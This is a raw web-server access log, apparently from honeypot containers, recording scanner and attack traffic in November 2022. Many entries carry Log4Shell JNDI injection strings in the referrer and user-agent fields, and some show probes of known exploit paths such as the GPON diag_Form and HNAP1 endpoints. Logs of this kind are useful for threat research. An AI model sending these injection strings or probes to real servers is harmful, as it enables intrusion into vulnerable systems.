swipe-t-2_running | 20.4.210.27 | 12/Nov/2022:17:26:19 | GET /.svn/ HTTP/1.1 | - | Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36 | y
swipe-t_running | 89.212.123.191 | 17/Nov/2022:10:26:55 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t_running | 222.134.240.92 | 17/Nov/2022:10:28:39 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t_running | 85.51.217.156 | 17/Nov/2022:10:34:55 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t_running | 213.255.16.153 | 17/Nov/2022:10:37:13 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
swipe-t_running | 223.171.91.127 | 17/Nov/2022:10:37:57 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t_running | 195.87.73.208 | 17/Nov/2022:10:39:59 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t_running | 195.87.73.176 | 17/Nov/2022:10:40:55 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t_running | 120.211.227.11 | 17/Nov/2022:10:41:51 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t_running | 129.154.55.234 | 17/Nov/2022:10:45:02 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t_running | 85.51.24.68 | 17/Nov/2022:10:50:34 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t_running | 157.245.97.223 | 17/Nov/2022:11:01:23 | \x16\x03\x01 | - | - | n
swipe-t_running | 157.245.97.223 | 17/Nov/2022:11:01:24 | \x16\x03\x01 | - | - | n
swipe-t_running | 157.245.97.223 | 17/Nov/2022:11:01:24 | GET / HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
swipe-t_running | 118.218.209.149 | 17/Nov/2022:11:04:34 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t_running | 103.105.12.48 | 17/Nov/2022:11:04:36 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t-2_running | 141.255.166.2 | 17/Nov/2022:10:17:32 | GET / HTTP/1.1 | - | Hello World | y
blank-t_running | 101.35.198.225 | 17/Nov/2022:11:17:52 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
pwd-t_running | 131.161.152.201 | 17/Nov/2022:10:24:41 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 | y
pwd-t_running | 85.31.44.156 | 17/Nov/2022:10:26:14 | GET / HTTP/1.1 | - | - | y
pwd-t_running | 85.31.44.156 | 17/Nov/2022:10:26:23 | POST /GponForm/diag_Form?images/ HTTP/1.1 | - | - | n
pwd-t_running | 172.105.89.161 | 17/Nov/2022:10:42:17 | \xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf\x159 X\xd4>\x12\x98\xc4<\xe0\x13\xcf | - | - | n
pwd-t_running | 193.47.61.60 | 17/Nov/2022:11:00:33 | GET / HTTP/1.1 | - | - | y
pwd-t_running | 193.47.61.60 | 17/Nov/2022:11:00:36 | POST /GponForm/diag_Form?images/ HTTP/1.1 | - | - | n
pwd-t_running | 141.255.166.2 | 17/Nov/2022:11:11:42 | GET / HTTP/1.1 | - | Hello World | y
blank-t-2_running | 194.146.24.107 | 17/Nov/2022:10:25:15 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
blank-t-2_running | 85.31.44.156 | 17/Nov/2022:10:30:51 | GET / HTTP/1.1 | - | - | y
blank-t-2_running | 85.31.44.156 | 17/Nov/2022:10:30:57 | POST /GponForm/diag_Form?images/ HTTP/1.1 | - | - | n
blank-t-2_running | 95.91.13.119 | 17/Nov/2022:10:31:45 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
blank-t-2_running | 159.65.242.113 | 17/Nov/2022:10:34:06 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t-2_running | 61.102.42.5 | 17/Nov/2022:10:36:26 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
blank-t-2_running | 85.51.217.156 | 17/Nov/2022:10:36:42 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
blank-t-2_running | 191.242.182.210 | 17/Nov/2022:10:38:56 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 195.87.73.208 | 17/Nov/2022:10:40:41 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
blank-t-2_running | 120.211.227.11 | 17/Nov/2022:10:41:46 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t-2_running | 121.200.53.148 | 17/Nov/2022:10:42:11 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 139.59.135.142 | 17/Nov/2022:10:42:28 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
blank-t-2_running | 1.220.98.197 | 17/Nov/2022:10:43:22 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
blank-t-2_running | 191.242.188.103 | 17/Nov/2022:10:44:49 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t-2_running | 89.121.228.38 | 17/Nov/2022:10:45:47 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 85.105.58.118 | 17/Nov/2022:10:46:04 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
blank-t-2_running | 117.80.212.33 | 17/Nov/2022:10:47:34 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
blank-t-2_running | 85.51.24.68 | 17/Nov/2022:10:49:05 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
blank-t-2_running | 180.93.32.58 | 17/Nov/2022:10:50:23 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
blank-t-2_running | 218.146.15.97 | 17/Nov/2022:10:50:44 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
blank-t-2_running | 94.177.20.162 | 17/Nov/2022:10:50:53 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 80.153.159.119 | 17/Nov/2022:10:50:54 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
blank-t-2_running | 40.87.11.253 | 17/Nov/2022:10:52:46 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 45.120.216.114 | 17/Nov/2022:10:52:55 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
blank-t-2_running | 185.55.64.228 | 17/Nov/2022:10:54:09 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
blank-t-2_running | 223.171.91.108 | 17/Nov/2022:10:54:40 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
blank-t-2_running | 120.224.143.251 | 17/Nov/2022:10:55:06 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
blank-t-2_running | 118.218.209.149 | 17/Nov/2022:10:57:17 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
blank-t-2_running | 223.171.91.118 | 17/Nov/2022:10:57:18 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
blank-t-2_running | 143.198.133.234 | 17/Nov/2022:11:00:37 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t-2_running | 82.64.113.245 | 17/Nov/2022:11:01:19 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
blank-t-2_running | 141.255.166.2 | 17/Nov/2022:11:05:38 | GET / HTTP/1.1 | - | Hello World | y
blank-t-2_running | 194.146.24.107 | 17/Nov/2022:11:18:10 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
blank-t-2_running | 141.255.166.2 | 17/Nov/2022:11:21:29 | GET / HTTP/1.1 | - | Hello World | y
it-t_running | 141.255.166.2 | 17/Nov/2022:11:07:23 | GET / HTTP/1.1 | - | Hello World | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:52 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:52 | GET /cdn/bootstrap.css HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:52 | GET /sites/default/themes/bootstrap/css/3.3.5/overrides-cosmo.min726b.css?rg27la HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:52 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/Software-_-Computers177a.png?itok=_mL8_HTO HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:52 | GET /sites/default/themes/bookstrap_subtheme/css/style726b.css?rg27la HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:52 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Get-Support-(tree)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:52 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/IT-Analytics-(brain)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:52 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Ideas-and-Projects-(lightbulb)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:52 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/Account-Settings2e64.png?itok=3b8i5AIh HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:53 | GET /sites/default/files/styles/home_news_icons/public/UMDimages/news/newsicons/news-icon6261.png?itok=HIdjWAsb HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:53 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/Secure-Data-(lock)2.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:53 | GET /sites/divisionofit.umd.edu/files/UMDimages/homepage/dis-logo.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:53 | GET /sites/default/files/dit-site-logo.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:53 | GET /sites/divisionofit.umd.edu/files/DITMain_700-x-150.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:54 | GET /sites/divisionofit.umd.edu/files/Terrapin-Tech-3.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:54 | GET /sites/divisionofit.umd.edu/files/Visotors-3.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:54 | GET /sites/divisionofit.umd.edu/files/Facbook-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:54 | GET /sites/divisionofit.umd.edu/files/Twitter-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:54 | GET /sites/divisionofit.umd.edu/files/Flicker-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:54 | GET /sites/divisionofit.umd.edu/files/Instagram-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:54 | GET /sites/divisionofit.umd.edu/files/YouTube-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 65.154.226.169 | 17/Nov/2022:11:08:55 | GET /sites/divisionofit.umd.edu/files/LinkedIn-58x58.png HTTP/1.1 | http://128.8.238.30/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
it-t_running | 221.15.124.105 | 17/Nov/2022:11:34:58 | POST /HNAP1/ HTTP/1.0 | - | - | n
it-t-2_running | 194.146.24.107 | 17/Nov/2022:11:06:24 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t-2_running | 141.255.166.2 | 17/Nov/2022:11:23:03 | GET / HTTP/1.1 | - | Hello World | y
swipe-t_running | 45.83.66.40 | 17/Nov/2022:11:14:24 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0 | y
swipe-t_running | 45.83.65.129 | 17/Nov/2022:11:14:24 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0 | y
swipe-t_running | 144.22.191.115 | 17/Nov/2022:11:14:57 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t_running | 65.154.226.166 | 17/Nov/2022:11:15:29 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
swipe-t_running | 65.154.226.166 | 17/Nov/2022:11:15:29 | GET /main.css HTTP/1.1 | http://128.8.238.179/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
swipe-t_running | 65.154.226.166 | 17/Nov/2022:11:15:29 | GET /university-of-maryland-logo.png HTTP/1.1 | http://128.8.238.179/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
swipe-t_running | 65.154.226.166 | 17/Nov/2022:11:15:29 | GET /dis-logo.png HTTP/1.1 | http://128.8.238.179/ | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36 | y
swipe-t_running | 61.102.42.5 | 17/Nov/2022:11:20:39 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t_running | 141.255.166.2 | 17/Nov/2022:11:21:22 | GET / HTTP/1.1 | - | Hello World | y
swipe-t_running | 85.51.24.68 | 17/Nov/2022:11:29:42 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
swipe-t_running | 159.89.172.91 | 17/Nov/2022:11:38:38 | HEAD / HTTP/1.0 | - | - | n
swipe-t_running | 159.89.172.91 | 17/Nov/2022:11:38:39 | GET /system_api.php HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
swipe-t_running | 159.89.172.91 | 17/Nov/2022:11:38:39 | GET /c/version.js HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
swipe-t_running | 159.89.172.91 | 17/Nov/2022:11:38:40 | GET /streaming/clients_live.php HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
swipe-t_running | 159.89.172.91 | 17/Nov/2022:11:38:40 | GET /stalker_portal/c/version.js HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
swipe-t_running | 159.89.172.91 | 17/Nov/2022:11:38:41 | GET /stream/live.php HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Spotify / 1.1.39.612 Safari / 537.36 | y
swipe-t_running | 159.89.172.91 | 17/Nov/2022:11:38:41 | GET /flu/403.html HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
swipe-t_running | 159.89.172.91 | 17/Nov/2022:11:38:42 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 | y
swipe-t_running | 85.51.217.156 | 17/Nov/2022:11:41:04 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
swipe-t_running | 141.255.166.2 | 17/Nov/2022:11:51:14 | GET / HTTP/1.1 | - | Hello World | y
swipe-t_running | 184.105.139.70 | 17/Nov/2022:11:56:07 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42 | y
swipe-t_running | 94.102.61.10 | 17/Nov/2022:12:00:05 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 | y
swipe-t_running | 184.105.139.114 | 17/Nov/2022:12:00:49 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 | y
swipe-t_running | 73.42.244.8 | 17/Nov/2022:12:04:18 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t-2_running | 141.255.166.2 | 17/Nov/2022:11:18:36 | GET / HTTP/1.1 | - | Hello World | y
swipe-t-2_running | 194.146.24.107 | 17/Nov/2022:11:21:54 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
swipe-t-2_running | 94.102.61.10 | 17/Nov/2022:12:01:54 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 | y
blank-t_running | 223.171.91.127 | 17/Nov/2022:12:18:22 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
pwd-t_running | 94.102.61.10 | 17/Nov/2022:12:05:16 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 | y
blank-t-2_running | 94.73.218.221 | 17/Nov/2022:11:31:14 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 | y
blank-t-2_running | 102.141.225.238 | 17/Nov/2022:11:31:49 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 118.41.204.72 | 17/Nov/2022:11:37:26 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
blank-t-2_running | 121.200.53.148 | 17/Nov/2022:11:38:57 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 80.153.159.119 | 17/Nov/2022:11:41:23 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
blank-t-2_running | 159.65.242.113 | 17/Nov/2022:11:41:27 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t-2_running | 195.87.73.208 | 17/Nov/2022:11:46:17 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
blank-t-2_running | 85.105.58.118 | 17/Nov/2022:11:48:58 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
blank-t-2_running | 218.146.15.97 | 17/Nov/2022:11:49:05 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
blank-t-2_running | 69.236.215.6 | 17/Nov/2022:11:49:06 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
blank-t-2_running | 139.59.135.142 | 17/Nov/2022:11:49:46 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
blank-t-2_running | 78.187.13.206 | 17/Nov/2022:11:49:50 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
blank-t-2_running | 191.242.188.103 | 17/Nov/2022:11:49:55 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t-2_running | 94.177.20.162 | 17/Nov/2022:11:50:10 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 89.212.123.191 | 17/Nov/2022:11:50:40 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
blank-t-2_running | 45.120.216.114 | 17/Nov/2022:11:51:02 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
blank-t-2_running | 85.51.217.156 | 17/Nov/2022:11:52:49 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
blank-t-2_running | 40.87.11.253 | 17/Nov/2022:11:53:08 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t-2_running | 223.171.91.133 | 17/Nov/2022:11:53:28 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
blank-t-2_running | 223.171.91.118 | 17/Nov/2022:11:53:31 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
blank-t-2_running | 120.224.143.251 | 17/Nov/2022:11:53:57 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
blank-t-2_running | 120.236.79.182 | 17/Nov/2022:11:54:23 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
